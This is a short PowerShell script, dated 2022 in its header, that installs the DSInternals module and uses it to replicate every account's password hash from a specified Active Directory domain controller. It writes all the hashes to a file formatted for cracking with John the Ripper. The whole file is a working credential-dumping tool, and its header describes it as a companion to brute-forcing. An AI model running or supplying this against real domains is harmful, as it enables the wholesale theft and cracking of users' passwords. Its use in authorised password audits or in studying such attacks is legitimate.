<#
    Get-DCHashes.ps1 - Kyle Smith 07/26/2022

    Originally a tool for bruteforcing, but John does this way better, so I will let him take the wheel in that department.
    Tool takes three arguments: Domain Controller address, Naming Context, and file to output to
    Tool outputs: All account password hashes in the given target in John the Ripper format

    Copyright 2022 Kyle Smith
    Licensed under GPL-3.0-or-later
#>

Param (
    [Parameter(Mandatory=$True, Position=1)]
    [String]$DC,
    [Parameter(Mandatory=$True, Position=2)]
    [String]$NC,
    [Parameter(Mandatory=$True, Position=3)]
    [String]$Out
)

Install-Module -Name DSInternals

Get-ADReplAccount -All -NamingContext $NC -Server $DC | 
    Format-Custom -View JohnNT | Out-File -FilePath $Out -Encoding ascii
